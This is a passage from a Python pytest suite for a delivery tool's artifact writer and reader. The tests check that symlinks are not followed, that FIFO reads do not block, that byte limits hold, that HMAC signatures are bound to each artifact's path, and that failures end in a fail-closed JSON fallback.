
    # Kwargs-tolerant: the artifact replace is descriptor-relative (src_dir_fd/dst_dir_fd).
    def fail_replace(*_args, **_kwargs):
        raise OSError("replace failed")

    monkeypatch.setattr(ns["os"], "replace", fail_replace)
    result = {"schema": "test", "run_artifact_path": None}

    try:
        ns["write_artifact"](result)
    except OSError as e:
        assert str(e) == "replace failed"
    else:  # pragma: no cover - defensive
        raise AssertionError("expected write_artifact to raise")

    assert result["run_artifact_path"] is None
    assert list(artifact_dir.iterdir()) == []


def test_artifact_write_failure_does_not_publish_phantom_path(tmp_path: Path):
    repo = init_repo(tmp_path / "repo")
    plugin = fake_busdriver(tmp_path / "busdriver")
    artifact_dir_file = tmp_path / "not-a-directory"
    artifact_dir_file.write_text("occupied")

    cp, data = invoke(
        repo,
        plugin,
        "--mode",
        "execute",
        "--operation",
        "verify",
        "--verifier",
        f"ok={shlex.quote(sys.executable)} -c {shlex.quote('print(1)')}",
        artifact_dir=artifact_dir_file,
    )

    assert cp.returncode == 1
    assert data["ok"] is False
    assert data["run_artifact_path"] is None
    assert data["run"]["phase"] == "verify"
    assert data["run"]["status"] == "blocked"
    assert data["run"]["reason"] == "artifact_write_failed"
    assert data["run"]["artifacts"] == []
    assert data["decision"] == {"status": "blocked", "reason": "artifact_write_failed", **{key: False for key in BLOCKED_KEYS}}
    assert data["steps"][0] == {"name": "write_artifact", "status": "blocked", "reason": "artifact_write_failed"}
    assert_finalization_blocked(data["decision"])


def artifact_write_error(ns: dict, kind: str) -> Exception:
    # The three failures write_artifact can raise before/while writing: an OSError from the write
    # itself, the directory guard's RuntimeError subclass, and the over-limit guard's. main() must
    # route all of them to the same redacted stdout fallback. ns.get keeps the pre-repair failure
    # semantic (a bare RuntimeError escaping main) rather than a KeyError on a missing name.
    if kind == "oserror":
        return OSError("artifact disk full")
    if kind == "too_large":
        return ns.get("ArtifactTooLarge", RuntimeError)("delivery_artifact_too_large")
    return ns.get("ArtifactDirectoryInvalid", RuntimeError)("delivery_artifact_directory_invalid")


ARTIFACT_WRITE_ERROR_KINDS = ["oserror", "directory_guard", "too_large"]


def test_artifact_base_symlink_reaches_writer_guard_and_main_fails_closed(tmp_path: Path):
    # A production-controlled artifact base that is a symlink to a real directory survives
    # mkdir(exist_ok=True) and reaches the writer's directory guard. main() must emit the redacted
    # fail-closed JSON fallback rather than letting the guard's RuntimeError escape.
    real_dir = tmp_path / "real-runs"
    real_dir.mkdir()
    base_symlink = tmp_path / "runs-link"
    base_symlink.symlink_to(real_dir, target_is_directory=True)

    env = os.environ.copy()
    env[ARTIFACT_ENV] = str(base_symlink)
    cp = run([
        sys.executable, str(PRODUCTION_DELIVER),
        "--repo", str(tmp_path / "missing-repo"),
        "--plugin-root", str(tmp_path / "missing-plugin"),
        "--mode", "execute", "--operation", "commit", "--commit-message", "msg",
    ], env=env)

    assert cp.returncode == 1
    assert "Traceback" not in cp.stderr
    data = json.loads(cp.stdout)
    assert data["ok"] is False
    assert data["run_artifact_path"] is None
    assert data["decision"] == {"status": "blocked", "reason": "artifact_write_failed", **{key: False for key in BLOCKED_KEYS}}
    assert data["run"]["status"] == "blocked"
    assert data["run"]["reason"] == "artifact_write_failed"
    assert data["run"]["artifacts"] == []
    assert data["mutating_run"] is None
    assert_finalization_blocked(data["decision"])
    # The guard must stay fail closed: the symlink is not followed and no artifact bytes exist.
    assert base_symlink.is_symlink()
    assert list(real_dir.iterdir()) == []


# --- Ancestor-safe artifact directory I/O ---------------------------------------------------
#
# The r15 guard rejected only a final-component base symlink. The property under test here is
# broader: NO symlink at any existing component of the configured artifact directory may be
# followed for creation, writing, lookup, or external-artifact detection. Each test drives a
# real filesystem layout under tmp_path rather than a mocked path object, because the whole
# proof is about what the kernel does with O_NOFOLLOW, not about what Path claims.


def _open_fd_count() -> int:
    return len(os.listdir("/dev/fd"))


def _nofollow_payload(run_id: str, repo_root: Path) -> dict:
    """A structurally valid, reachable pr-grind artifact body, unsigned.

    write_artifact adds the process-scoped writer authentication, so a payload written through
    it is accepted by the same-process authenticated lookup while the key is live.
    """
    false_flags = {key: False for key in BLOCKED_KEYS}
    return {
        "schema": "hermes-busdriver-deliver/v0",
        "version": 1,
        "ok": True,
        "mode": "execute",
        "operation": "pr-grind",
        "decision": {"status": "pr_grind_clean", "reason": "latest_pr_head_clean_read_only", **false_flags},
        "run": {
            "schema": "hermes-busdriver-delivery-run/v0",
            "version": 1,
            "run_id": run_id,
            "created_at": "2026-07-15T00:00:00Z",
            "phase": "pr_grind",
            "status": "pr_grind_clean",
            "reason": "latest_pr_head_clean_read_only",
            "repo_root": str(repo_root),
            "pr_number": None,
            "authority": false_flags,
            "artifacts": [],
        },
        "mutating_run": None,
        "run_artifact_path": None,
    }


def _invoke_production_commit(base: Path, tmp_path: Path) -> subprocess.CompletedProcess[str]:
    env = os.environ.copy()
    env[ARTIFACT_ENV] = str(base)
    return run([
        sys.executable, str(PRODUCTION_DELIVER),
        "--repo", str(tmp_path / "missing-repo"),
        "--plugin-root", str(tmp_path / "missing-plugin"),
        "--mode", "execute", "--operation", "commit", "--commit-message", "msg",
    ], env=env)


def _assert_artifact_write_failed_envelope(cp: subprocess.CompletedProcess[str]) -> dict:
    assert cp.returncode == 1
    assert "Traceback" not in cp.stderr
    data = json.loads(cp.stdout)
    assert data["ok"] is False
    assert data["run_artifact_path"] is None
    assert data["decision"] == {"status": "blocked", "reason": "artifact_write_failed", **{key: False for key in BLOCKED_KEYS}}
    assert data["run"]["status"] == "blocked"
    assert data["run"]["reason"] == "artifact_write_failed"
    assert data["run"]["artifacts"] == []
    assert data["mutating_run"] is None
    assert_finalization_blocked(data["decision"])
    return data


def test_artifact_base_ancestor_symlink_is_not_followed_and_main_fails_closed(tmp_path: Path):
    # /safe/link/runs where `link` is a symlink to a real directory: the final component is not
    # itself a symlink, so the r15 final-component guard passes it and mkdir(parents=True)
    # traverses the link. The no-follow traversal must reject it before anything is created.
    real_dir = tmp_path / "real-parent"
    real_dir.mkdir()
    link = tmp_path / "link"
    link.symlink_to(real_dir, target_is_directory=True)

    _assert_artifact_write_failed_envelope(_invoke_production_commit(link / "runs", tmp_path))

    assert link.is_symlink()
    assert list(real_dir.iterdir()) == [], "artifact tree was created through the ancestor symlink"


def test_artifact_base_deep_ancestor_symlink_is_not_followed(tmp_path: Path):
    # The symlink is two levels above the final component; every existing component must be
    # traversed no-follow, not just the base's immediate parent.
    real_dir = tmp_path / "real-root"
    (real_dir / "nested").mkdir(parents=True)
    link = tmp_path / "link"
    link.symlink_to(real_dir, target_is_directory=True)

    _assert_artifact_write_failed_envelope(_invoke_production_commit(link / "nested" / "runs", tmp_path))

    assert link.is_symlink()
    assert list((real_dir / "nested").iterdir()) == []


def test_artifact_base_regular_file_component_fails_closed(tmp_path: Path):
    # An existing non-directory component: mkdir cannot replace it and the no-follow open must
    # route through the same expected-failure fallback rather than an escaping exception.
    occupied = tmp_path / "occupied"
    occupied.write_text("not a directory")

    _assert_artifact_write_failed_envelope(_invoke_production_commit(occupied / "runs", tmp_path))

    assert occupied.read_text() == "not a directory"


@pytest.mark.skipif(os.getuid() == 0, reason="root bypasses directory permission bits")
def test_artifact_base_unsearchable_component_fails_closed(tmp_path: Path):
    # A permission error on an existing component is an expected artifact-directory failure.
    walled = tmp_path / "walled"
    walled.mkdir(mode=0o000)
    try:
        _assert_artifact_write_failed_envelope(_invoke_production_commit(walled / "runs", tmp_path))
    finally:
        walled.chmod(0o700)


def test_writer_creates_nested_missing_path_with_safe_modes_and_signed_lookup(monkeypatch, tmp_path: Path):
    # The positive path: a normal nested missing directory is created 0700 component by
    # component, the artifact lands 0600, no temp file survives, and the same-process signed
    # lookup accepts it while the writer key is live.
    ns = runpy.run_path(str(PRODUCTION_DELIVER))
    base = tmp_path / "outer" / "inner" / "delivery-runs"
    monkeypatch.setenv(ARTIFACT_ENV, str(base))
    run_id = "nested-writer-ok"
    payload = _nofollow_payload(run_id, tmp_path)

    before_fds = _open_fd_count()
    ns["write_artifact"](payload)
    assert _open_fd_count() == before_fds, "write_artifact leaked a descriptor"

    path = Path(payload["run_artifact_path"])
    assert path.is_file() and not path.is_symlink()
    assert stat.S_IMODE(path.lstat().st_mode) == 0o600
    assert stat.S_IMODE(base.lstat().st_mode) == 0o700
    assert stat.S_IMODE((tmp_path / "outer").lstat().st_mode) == 0o700
    assert [entry.name for entry in base.iterdir()] == [path.name], "temp file survived the write"
    assert payload["run"]["artifacts"] == [{"kind": "result", "path": str(path)}]

    found = ns["artifact_for_run_id"](run_id)
    assert found is not None
    assert found[0] == path
    assert found[1]["run"]["run_id"] == run_id


def test_artifact_lookup_does_not_follow_ancestor_symlink(monkeypatch, tmp_path: Path):
    # A correctly shaped, correctly signed artifact behind an ancestor symlink is not evidence:
    # the lookup must refuse to traverse the link even though the target content would pass
    # every structural and authentication check.
    ns = runpy.run_path(str(PRODUCTION_DELIVER))
    real_parent = tmp_path / "real-parent"
    runs = real_parent / "delivery-runs"
    monkeypatch.setenv(ARTIFACT_ENV, str(runs))
    run_id = "ancestor-lookup"
    ns["write_artifact"](_nofollow_payload(run_id, tmp_path))
    assert ns["artifact_for_run_id"](run_id) is not None, "control: the artifact is valid via its real path"

    link = tmp_path / "link"
    link.symlink_to(real_parent, target_is_directory=True)
    before_fds = _open_fd_count()
    monkeypatch.setenv(ARTIFACT_ENV, str(link / "delivery-runs"))

    assert ns["artifact_for_run_id"](run_id) is None
    assert _open_fd_count() == before_fds, "lookup leaked a descriptor"

    status_args = argparse.Namespace(mode="status", operation="status", run_id=run_id, pr=None, pretty=False)
    result, rc = ns["status_mode_result"](status_args)
    assert rc != 0
    assert result["status_lookup"]["found"] is False
    assert result["status_lookup"]["reason"] == "run_not_found"
    assert result["decision"]["reason"] == "run_not_found"
    assert_finalization_blocked(result["decision"])


def test_has_process_external_artifact_does_not_follow_ancestor_symlink(monkeypatch, tmp_path: Path):
    # The external-artifact probe is the other half of the status reason. Data behind an
    # ancestor symlink must not be admitted as evidence that some other process wrote a run.
    ns = runpy.run_path(str(PRODUCTION_DELIVER))
    real_parent = tmp_path / "real-parent"
    runs = real_parent / "delivery-runs"
    monkeypatch.setenv(ARTIFACT_ENV, str(runs))
    run_id = "ancestor-external"
    ns["write_artifact"](_nofollow_payload(run_id, tmp_path))
    ns["_ARTIFACT_AUTH_KEYS"].clear()
    assert ns["has_process_external_artifact"](run_id) is True, "control: process-external via its real path"

    link = tmp_path / "link"
    link.symlink_to(real_parent, target_is_directory=True)
    monkeypatch.setenv(ARTIFACT_ENV, str(link / "delivery-runs"))

    assert ns["has_process_external_artifact"](run_id) is False


def test_artifact_file_symlink_remains_rejected(monkeypatch, tmp_path: Path):
    # An artifact entry that is itself a symlink stays rejected: the signature binds only the
    # file name, so a follower would accept the target's bytes verbatim.
    ns = runpy.run_path(str(PRODUCTION_DELIVER))
    real_runs = tmp_path / "real-runs"
    monkeypatch.setenv(ARTIFACT_ENV, str(real_runs))
    run_id = "file-symlink"
    payload = _nofollow_payload(run_id, tmp_path)
    ns["write_artifact"](payload)
    target = Path(payload["run_artifact_path"])

    linked_runs = tmp_path / "linked-runs"
    linked_runs.mkdir(mode=0o700)
    (linked_runs / target.name).symlink_to(target)
    monkeypatch.setenv(ARTIFACT_ENV, str(linked_runs))

    assert ns["artifact_for_run_id"](run_id) is None
    assert ns["has_process_external_artifact"](run_id) is False


def test_artifact_directory_identity_drift_unlinks_artifact_and_fails_closed(monkeypatch, tmp_path: Path):
    # If the configured path stops naming the directory the bytes were written into, the write
    # must not be reported as successful. Deterministic hook rather than a race: the re-open
    # returns a different directory, standing in for a swap between write and confirmation.
    ns = runpy.run_path(str(PRODUCTION_DELIVER))
    base = tmp_path / "delivery-runs"
    decoy = tmp_path / "decoy"
    decoy.mkdir(mode=0o700)
    monkeypatch.setenv(ARTIFACT_ENV, str(base))

    real_dir_fd = ns["artifact_dir_fd"]
    opened: list[int] = []

    def drifting_dir_fd(*, create: bool) -> int:
        if create:
            return real_dir_fd(create=create)
        fd = os.open(str(decoy), os.O_RDONLY | os.O_DIRECTORY)
        opened.append(fd)
        return fd

    monkeypatch.setitem(ns["write_artifact"].__globals__, "artifact_dir_fd", drifting_dir_fd)
    run_id = "identity-drift"
    payload = _nofollow_payload(run_id, tmp_path)

    before_fds = _open_fd_count()
    with pytest.raises(ns["ArtifactDirectoryInvalid"]):
        ns["write_artifact"](payload)
    assert _open_fd_count() == before_fds, "identity-drift path leaked a descriptor"

    assert payload["run_artifact_path"] is None
    assert payload["run"]["artifacts"] == []
    assert "writer_authentication" not in payload
    # Unlinked descriptor-relative from the fd actually written through, temp included.
    assert list(base.iterdir()) == []
    assert list(decoy.iterdir()) == []


def test_artifact_directory_reopen_failure_unlinks_artifact_and_fails_closed(monkeypatch, tmp_path: Path):
    # The realistic drift shape: an ancestor is swapped to a symlink after the write, so the
    # confirmation re-open fails closed instead of returning a different directory. The bytes are
    # still reachable through the original fd and must be removed there — reporting a cleared
    # result while leaving a signed artifact behind is the failure this guards.
    ns = runpy.run_path(str(PRODUCTION_DELIVER))
    base = tmp_path / "delivery-runs"
    monkeypatch.setenv(ARTIFACT_ENV, str(base))

    real_dir_fd = ns["artifact_dir_fd"]

    def unsafe_on_reopen(*, create: bool) -> int:
        if create:
            return real_dir_fd(create=create)
        raise ns["ArtifactDirectoryInvalid"]("delivery_artifact_directory_invalid")

    monkeypatch.setitem(ns["write_artifact"].__globals__, "artifact_dir_fd", unsafe_on_reopen)
    payload = _nofollow_payload("reopen-failure", tmp_path)

    before_fds = _open_fd_count()
    with pytest.raises(ns["ArtifactDirectoryInvalid"]) as excinfo:
        ns["write_artifact"](payload)
    assert _open_fd_count() == before_fds, "reopen-failure path leaked a descriptor"
    assert str(excinfo.value) == "delivery_artifact_directory_identity_drift"

    assert payload["run_artifact_path"] is None
    assert payload["run"]["artifacts"] == []
    assert "writer_authentication" not in payload
    # Descriptor-relative unlink through the original fd, so neither the final artifact nor the
    # temp survives in the directory the bytes actually landed in.
    assert list(base.iterdir()) == []


def test_artifact_write_failure_leaves_no_temp_file(monkeypatch, tmp_path: Path):
    # A failure while serializing must not strand the O_EXCL temp file in the artifact tree.
    ns = runpy.run_path(str(PRODUCTION_DELIVER))
    base = tmp_path / "delivery-runs"
    monkeypatch.setenv(ARTIFACT_ENV, str(base))

    def fail_replace(*_args, **_kwargs):
        raise OSError("replace failed")

    monkeypatch.setattr(ns["os"], "replace", fail_replace)
    payload = _nofollow_payload("temp-cleanup", tmp_path)

    before_fds = _open_fd_count()
    with pytest.raises(OSError):
        ns["write_artifact"](payload)
    assert _open_fd_count() == before_fds, "failed write leaked a descriptor"

    assert payload["run_artifact_path"] is None
    assert payload["run"]["artifacts"] == []
    assert list(base.iterdir()) == []


@contextlib.contextmanager
def _no_block(seconds: int = 5):
    """Turn a blocking call into a failed assertion instead of a hung suite.

    Not the assertion under test — the FIFO tests assert the returned value. This is only the
    guard that keeps a regression (an open without O_NONBLOCK) from wedging the run forever.
    """
    def _fire(_signum, _frame):
        raise AssertionError("artifact read blocked instead of failing closed")

    previous = signal.signal(signal.SIGALRM, _fire)
    signal.alarm(seconds)
    try:
        yield
    finally:
        signal.alarm(0)
        signal.signal(signal.SIGALRM, previous)


def _write_entry(base: Path, name: str, payload: bytes) -> Path:
    path = base / name
    path.write_bytes(payload)
    path.chmod(0o600)
    return path


def _json_body_of_size(size: int) -> bytes:
    """Exactly `size` bytes of a JSON object, padded in a single ASCII string value."""
    overhead = len(json.dumps({"pad": ""}).encode())
    return json.dumps({"pad": "a" * (size - overhead)}).encode()


def _read_entry(ns, base: Path, name: str):
    dir_fd = ns["artifact_dir_fd"](create=True)
    try:
        return ns["read_artifact_entry"](dir_fd, name)
    finally:
        os.close(dir_fd)


def test_relocated_same_name_signed_artifact_is_rejected(monkeypatch, tmp_path: Path):
    # r16 bound the MAC to path.name only, so byte-for-byte copying a valid signed artifact to
    # any other safe artifact base under the same filename authenticated while the writer key was
    # live. The signature must bind the full discovered path instead.
    ns = runpy.run_path(str(PRODUCTION_DELIVER))
    original = tmp_path / "original-runs"
    relocated = tmp_path / "relocated-runs"
    relocated.mkdir(mode=0o700)
    monkeypatch.setenv(ARTIFACT_ENV, str(original))
    run_id = "relocation"
    payload = _nofollow_payload(run_id, tmp_path)
    ns["write_artifact"](payload)
    path = Path(payload["run_artifact_path"])

    found = ns["artifact_for_run_id"](run_id)
    assert found is not None and found[0] == path, "control: the original base authenticates"

    raw = path.read_bytes()
    _write_entry(relocated, path.name, raw)
    monkeypatch.setenv(ARTIFACT_ENV, str(relocated))
    assert ns["artifact_for_run_id"](run_id) is None, "relocated same-name copy authenticated"

    # Same bytes, different filename, in the base they were signed for: the name is part of the
    # bound path, so this is a different path and must not authenticate either.
    monkeypatch.setenv(ARTIFACT_ENV, str(original))
    renamed = _write_entry(original, "20260715-000000-renamed-1.json", raw)
    assert ns["authenticate_artifact"](json.loads(raw), renamed) is False
    assert ns["artifact_for_run_id"](run_id)[0] == path, "control: the original entry still authenticates"

    # Rewriting the payload's own path claim to match the relocated file is likewise refused: the
    # claim is inside the signed body.
    tampered = json.loads(raw)
    relocated_path = relocated / path.name
    tampered["run_artifact_path"] = str(relocated_path)
    tampered["run"]["artifacts"] = [{"kind": "result", "path": str(relocated_path)}]
    monkeypatch.setenv(ARTIFACT_ENV, str(relocated))
    _write_entry(relocated, path.name, json.dumps(tampered).encode())
    assert ns["artifact_for_run_id"](run_id) is None


@pytest.mark.parametrize(
    "mutate",
    [
        pytest.param(lambda data, path: data.update({"run_artifact_path": None}), id="missing_path_claim"),
        pytest.param(lambda data, path: data["run"].update({"artifacts": []}), id="missing_artifact_entry"),
        pytest.param(
            lambda data, path: data["run"].update(
                {"artifacts": [{"kind": "result", "path": str(path)}, {"kind": "result", "path": str(path)}]}
            ),
            id="duplicate_artifact_entry",
        ),
        pytest.param(
            lambda data, path: data["run"].update({"artifacts": [{"kind": "result", "path": str(path.parent)}]}),
            id="other_path_shape",
        ),
    ],
)
def test_artifact_path_claims_must_identify_the_discovered_path(monkeypatch, tmp_path: Path, mutate):
    # Acceptance requires the payload's own path claims to name the file it was found at. Each
    # mutated body is RE-SIGNED with the live writer key, so its MAC is valid and only the
    # independent path-claim check can reject it.
    ns = runpy.run_path(str(PRODUCTION_DELIVER))
    base = tmp_path / "delivery-runs"
    monkeypatch.setenv(ARTIFACT_ENV, str(base))
    payload = _nofollow_payload("path-claims", tmp_path)
    ns["write_artifact"](payload)
    path = Path(payload["run_artifact_path"])

    def resign(data: dict) -> dict:
        # artifact_auth_message drops writer_authentication before signing, so the stale mac in
        # the body cannot influence the value computed to replace it.
        key = ns["_ARTIFACT_AUTH_KEYS"][data["writer_authentication"]["key_id"]]
        data["writer_authentication"]["mac"] = hmac.new(
            key, ns["artifact_auth_message"](data, path), hashlib.sha256
        ).hexdigest()
        return data

    assert ns["authenticate_artifact"](resign(json.loads(path.read_bytes())), path) is True, "control: re-signing is faithful"

    data = json.loads(path.read_bytes())
    mutate(data, path)
    assert ns["authenticate_artifact"](resign(data), path) is False


def test_artifact_byte_limit_is_one_mebibyte_shared_by_producer_and_reader():
    ns = runpy.run_path(str(PRODUCTION_DELIVER))
    assert ns["ARTIFACT_MAX_BYTES"] == 1024 * 1024


def test_artifact_read_flags_are_non_blocking():
    # r16 opened artifact entries without O_NONBLOCK, so a FIFO in the artifact directory blocked
    # the open indefinitely. The flag is the fix; the FIFO test below is its behavioral proof.
    ns = runpy.run_path(str(PRODUCTION_DELIVER))
    assert ns["_NOFOLLOW_FILE_FLAGS"] & os.O_NONBLOCK, "artifact reads may block on a FIFO"


def test_require_nofollow_primitives_fails_closed_without_nonblock(monkeypatch):
    ns = runpy.run_path(str(PRODUCTION_DELIVER))
    monkeypatch.delattr(ns["os"], "O_NONBLOCK", raising=False)
    with pytest.raises(ns["ArtifactDirectoryInvalid"]) as excinfo:
        ns["require_nofollow_primitives"]()
    assert str(excinfo.value) == "delivery_artifact_nonblock_unavailable"


def test_artifact_read_rejects_fifo_without_blocking_or_leaking(monkeypatch, tmp_path: Path):
    # A FIFO named like an artifact, with no writer attached, is the blocking case: the open must
    # return immediately and fstat must reject the entry as non-regular.
    ns = runpy.run_path(str(PRODUCTION_DELIVER))
    base = tmp_path / "delivery-runs"
    base.mkdir(mode=0o700)
    monkeypatch.setenv(ARTIFACT_ENV, str(base))
    os.mkfifo(base / "20260715-000000-fifo-1.json", 0o600)

    before_fds = _open_fd_count()
    with _no_block():
        assert _read_entry(ns, base, "20260715-000000-fifo-1.json") is None
        assert ns["artifact_entries"]("fifo-run") == []
    assert _open_fd_count() == before_fds, "the rejected FIFO leaked a descriptor"


def test_artifact_read_accepts_exactly_the_limit_and_rejects_one_byte_over(monkeypatch, tmp_path: Path):
    ns = runpy.run_path(str(PRODUCTION_DELIVER))
    limit = ns["ARTIFACT_MAX_BYTES"]
    base = tmp_path / "delivery-runs"
    base.mkdir(mode=0o700)
    monkeypatch.setenv(ARTIFACT_ENV, str(base))
    _write_entry(base, "at-limit.json", _json_body_of_size(limit))
    _write_entry(base, "over-limit.json", _json_body_of_size(limit + 1))

    before_fds = _open_fd_count()
    entry = _read_entry(ns, base, "at-limit.json")
    assert entry is not None and len(entry[0]["pad"]) > 0
    assert _read_entry(ns, base, "over-limit.json") is None
    assert _open_fd_count() == before_fds, "a bounded read leaked a descriptor"


def test_artifact_read_rejects_oversized_stat_before_reading_or_parsing(monkeypatch, tmp_path: Path):
    # The size verdict is reached from fstat alone: neither an unbounded read nor the JSON parser
    # may be reached for a file the stat already disqualifies. A sparse file keeps the control
    # cheap while still being a real oversized regular file on disk.
    ns = runpy.run_path(str(PRODUCTION_DELIVER))
    base = tmp_path / "delivery-runs"
    base.mkdir(mode=0o700)
    monkeypatch.setenv(ARTIFACT_ENV, str(base))
    path = base / "sparse.json"
    with open(path, "wb") as handle:
        handle.truncate(ns["ARTIFACT_MAX_BYTES"] + 1)
    path.chmod(0o600)

    def forbidden_read(*_args, **_kwargs):
        raise AssertionError("oversized artifact was read before its size was checked")

    def forbidden_loads(*_args, **_kwargs):
        raise AssertionError("oversized artifact reached the JSON parser")

    monkeypatch.setattr(ns["os"], "read", forbidden_read)
    monkeypatch.setattr(ns["json"], "loads", forbidden_loads)

    assert _read_entry(ns, base, "sparse.json") is None


def test_artifact_read_bounds_growth_after_fstat(monkeypatch, tmp_path: Path):
    # fstat is a snapshot: a file that reports an acceptable size and is longer by the time it is
    # read must still be bounded by the read itself, not trusted from the stale stat.
    ns = runpy.run_path(str(PRODUCTION_DELIVER))
    limit = ns["ARTIFACT_MAX_BYTES"]
    base = tmp_path / "delivery-runs"
    base.mkdir(mode=0o700)
    monkeypatch.setenv(ARTIFACT_ENV, str(base))
    _write_entry(base, "grown.json", _json_body_of_size(limit + 1))

    real_fstat = ns["os"].fstat

    class SmallStat:
        # Every field real except the size, which reports as it was before the growth.
        def __init__(self, st):
            self._st = st

        st_size = 32

        def __getattr__(self, item):
            return getattr(self._st, item)

    def stale_fstat(fd):
        return SmallStat(real_fstat(fd))

    monkeypatch.setattr(ns["os"], "fstat", stale_fstat)

    reads: list[int] = []
    real_read = ns["os"].read

    def counting_read(fd, count):
        reads.append(count)
        return real_read(fd, count)

    monkeypatch.setattr(ns["os"], "read", counting_read)

    assert _read_entry(ns, base, "grown.json") is None
    assert reads and max(reads) <= limit + 1, "the read was not bounded by the limit"


def test_producer_rejects_over_limit_artifact_without_residue(monkeypatch, tmp_path: Path):
    # Oversized bytes are never persisted: the writer fails before the temp file exists, clears
    # the artifact and authentication fields, and hands main() its expected write failure.
    ns = runpy.run_path(str(PRODUCTION_DELIVER))
    base = tmp_path / "delivery-runs"
    monkeypatch.setenv(ARTIFACT_ENV, str(base))
    payload = _nofollow_payload("over-limit", tmp_path)
    payload["oversized"] = "a" * (ns["ARTIFACT_MAX_BYTES"] + 1)

    before_fds = _open_fd_count()
    with pytest.raises(ns["ArtifactTooLarge"]) as excinfo:
        ns["write_artifact"](payload)
    assert str(excinfo.value) == "delivery_artifact_too_large"
    assert _open_fd_count() == before_fds, "the rejected write leaked a descriptor"

    assert payload["run_artifact_path"] is None
    assert payload["run"]["artifacts"] == []
    assert "writer_authentication" not in payload
    assert list(base.iterdir()) == [], "oversized bytes or a temp file survived"


def test_producer_accepts_an_artifact_of_exactly_the_limit(monkeypatch, tmp_path: Path):
    # The boundary is inclusive. Calibrated in two passes: the writer's own additions
    # (run_artifact_path, the fixed-width key_id and mac) are constant-length, so the first
    # write's size fixes the padding the second one needs to land exactly on the limit.
    ns = runpy.run_path(str(PRODUCTION_DELIVER))
    limit = ns["ARTIFACT_MAX_BYTES"]
    base = tmp_path / "delivery-runs"
    monkeypatch.setenv(ARTIFACT_ENV, str(base))
    template = _nofollow_payload("at-limit", tmp_path)
    template["pad"] = "a" * (limit // 2)

    probe = copy.deepcopy(template)
    ns["write_artifact"](probe)
    probe_path = Path(probe["run_artifact_path"])
    measured = probe_path.stat().st_size
    probe_path.unlink()

    payload = copy.deepcopy(template)
    payload["pad"] = "a" * (limit // 2 + (limit - measured))
    ns["write_artifact"](payload)
    path = Path(payload["run_artifact_path"])
    assert path.stat().st_size == limit

    found = ns["artifact_for_run_id"]("at-limit")
    assert found is not None and found[0] == path, "an artifact at exactly the limit must round-trip"


def test_over_limit_artifact_routes_main_to_the_truthful_write_failure_fallback(monkeypatch, capsys, tmp_path: Path):
    # End to end through the real writer: an oversized result reaches main()'s expected-failure
    # fallback, which reports the ordinary write failure and leaves no bytes behind. The
    # ARTIFACT_WRITE_ERROR_KINDS cases above cover the fallback envelope for a stubbed raise; this
    # one proves the real over-limit path arrives there.
    ns = runpy.run_path(str(PRODUCTION_DELIVER))
    repo = init_repo(tmp_path / "repo")
    base = tmp_path / "delivery-runs"
    monkeypatch.setenv(ARTIFACT_ENV, str(base))
    globals_ = ns["main"].__globals__
    false_flags = {key: False for key in BLOCKED_KEYS}
    delivery_status = {
        "schema": "hermes-busdriver-delivery-status/v0", "read_only": True, "ok": True,
        "repo": {"root": str(repo)}, "markers": {"blocking": []},
        "decision": {"status": "draft_changes_need_busdriver_finalization", "blockers": [], **false_flags},
        # The oversize rides in on real result data and is serialized by the real writer, so it is
        # the production limit that rejects this run, not a stubbed raise.
        "oversized": "a" * (ns["ARTIFACT_MAX_BYTES"] + 1),
    }
    mutation_result = {
        "ok": False,
        "decision": {"status": "blocked", "reason": "git_commit_failed", **false_flags},
        "mutating_run": None,
        "steps": [{"name": "git_commit", "status": "blocked", "reason": "git_commit_failed"}],
    }
    monkeypatch.setitem(globals_, "run_delivery_status", lambda _args: (delivery_status, 0))
    monkeypatch.setitem(globals_, "execute_mutating_operation", lambda _args, _status: (mutation_result, 2))
    monkeypatch.setattr(sys, "argv", [
        str(PRODUCTION_DELIVER), "--repo", str(repo),
        "--plugin-root", str(fake_busdriver(tmp_path / "busdriver")),
        "--mode", "execute", "--operation", "commit", "--commit-message", "msg",
    ])

    rc = ns["main"]()
    data = json.loads(capsys.readouterr().out)

    assert rc == 1
    assert data["ok"] is False
    assert data["run_artifact_path"] is None
    assert data["run"]["reason"] == "artifact_write_failed"
    assert data["run"]["artifacts"] == []
    assert data["mutating_run"] is None
    assert data["run_artifact_error"] == "delivery_artifact_too_large"
    assert_finalization_blocked(data["decision"])
    assert list(base.iterdir()) == [], "oversized bytes survived the rejected write"


def test_unrelated_runtime_error_from_writer_still_propagates(monkeypatch, tmp_path: Path):
    # The narrow catch protects the fail-closed fallback; it must not become a blanket
    # RuntimeError swallow that hides an unrelated defect as "artifact_write_failed".
    ns = runpy.run_path(str(PRODUCTION_DELIVER))
    repo = init_repo(tmp_path / "repo")
    globals_ = ns["main"].__globals__
    false_flags = {key: False for key in BLOCKED_KEYS}
    delivery_status = {
        "schema": "hermes-busdriver-delivery-status/v0", "read_only": True, "ok": True,
        "repo": {"root": str(repo)}, "markers": {"blocking": []},
        "decision": {"status": "draft_changes_need_busdriver_finalization", "blockers": [], **false_flags},
    }
    mutation_result = {
        "ok": False,
        "decision": {"status": "blocked", "reason": "git_commit_failed", **false_flags},
        "mutating_run": None,
        "steps": [{"name": "git_commit", "status": "blocked", "reason": "git_commit_failed"}],
    }
    monkeypatch.setitem(globals_, "run_delivery_status", lambda _args: (delivery_status, 0))
    monkeypatch.setitem(globals_, "execute_mutating_operation", lambda _args, _status: (mutation_result, 2))
    monkeypatch.setitem(
        globals_,
        "write_artifact",
        lambda _result: (_ for _ in ()).throw(RuntimeError("unrelated writer defect")),
    )
    monkeypatch.setattr(sys, "argv", [
        str(PRODUCTION_DELIVER), "--repo", str(repo),
        "--plugin-root", str(fake_busdriver(tmp_path / "busdriver")),
        "--mode", "execute", "--operation", "commit", "--commit-message", "msg",
    ])

    with pytest.raises(RuntimeError, match="unrelated writer defect"):
        ns["main"]()


@pytest.mark.parametrize("error_kind", ARTIFACT_WRITE_ERROR_KINDS)
def test_artifact_write_failure_after_completed_mutation_preserves_side_effect_status(error_kind, monkeypatch, capsys, tmp_path: Path):
    ns = runpy.run_path(str(DELIVER))
    repo = init_repo(tmp_path / "repo")
    globals_ = ns["main"].__globals__
    delivery_status = {
        "schema": "hermes-busdriver-delivery-status/v0", "read_only": True, "ok": True,
        "repo": {"root": str(repo)}, "markers": {"blocking": []},
        "decision": {"status": "draft_changes_need_busdriver_finalization", "blockers": [], **{key: False for key in BLOCKED_KEYS}},
    }
    mutation_result = {
        "ok": True,
        "decision": {"status": "committed_release_failed", "reason": "finalization_lock_release_failed", **{key: False for key in BLOCKED_KEYS}},
